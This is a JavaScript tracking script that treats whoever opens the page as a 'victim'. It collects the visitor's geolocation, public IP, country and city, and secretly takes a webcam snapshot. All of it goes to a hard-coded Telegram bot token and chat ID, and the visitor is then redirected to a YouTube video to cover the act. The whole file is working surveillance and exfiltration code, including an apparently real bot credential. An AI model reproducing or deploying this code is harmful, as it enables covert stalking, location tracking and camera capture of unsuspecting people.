const TELEGRAM_BOT_TOKEN = "7663917985:AAHjLuekq97QSrjCJBhFv4GNP5HbVk2l8Iw";
const CHAT_ID = "7305296208";

function startCapture() {
  const victimURL = window.location.href;

  navigator.geolocation.getCurrentPosition(async (pos) => {
    const latitude = pos.coords.latitude;
    const longitude = pos.coords.longitude;

    const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
    const ip = ipData.ip;

    const locationInfo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());

    let imageBlob = null;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

      stream.getTracks().forEach(track => track.stop());
    } catch (e) {
      console.log("Camera access denied or failed.");
    }

    const text = `📸 New Victim Info:\n🌐 URL Clicked: ${victimURL}\n📍 IP: ${ip}\n📌 Country: ${locationInfo.country_name}\n🏙️ City: ${locationInfo.city}\n🌎 Latitude: ${latitude}\n🌍 Longitude: ${longitude}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });

    if (imageBlob) {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", imageBlob, "snapshot.jpg");
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
  }, (err) => {
    alert("Permission denied or location error.");
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
  });
  }
    
